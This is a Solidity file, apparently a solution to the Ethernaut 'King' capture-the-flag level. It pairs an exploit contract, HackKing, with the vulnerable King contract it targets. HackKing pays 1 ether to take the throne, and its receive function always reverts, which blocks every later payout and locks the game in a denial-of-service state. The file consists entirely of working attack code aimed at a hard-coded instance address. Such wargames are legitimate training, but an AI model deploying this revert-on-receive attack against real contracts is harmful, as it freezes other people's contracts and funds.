// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/King.sol';

contract HackKing {
    // Complete with the address of the instance
    King public king = King(payable(0x1CE41Bc8C1907233954737Dae8Ab1D7E0aa7Bbda));

    // Allow your contract to receive ether throw this function
    // Send at least 1 ether to your contract
    function receiveEther() public payable {
    }

    // This function it's not need it
    // it's just in case you miss something you can recover the ether you send to this contract
    function transferBack(address myAddress, uint256 toReceiveBack) public {
        address(myAddress).call{value: toReceiveBack}("");
    }

    // Call the fallback function of the contract with this function and send 1 ether
    function becomeKing() public {
        address(king).call{value: 1 ether}("");
    }

    receive() external payable {
        revert('This way you prevent the level to reclaim ownership once you submit the instance');
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}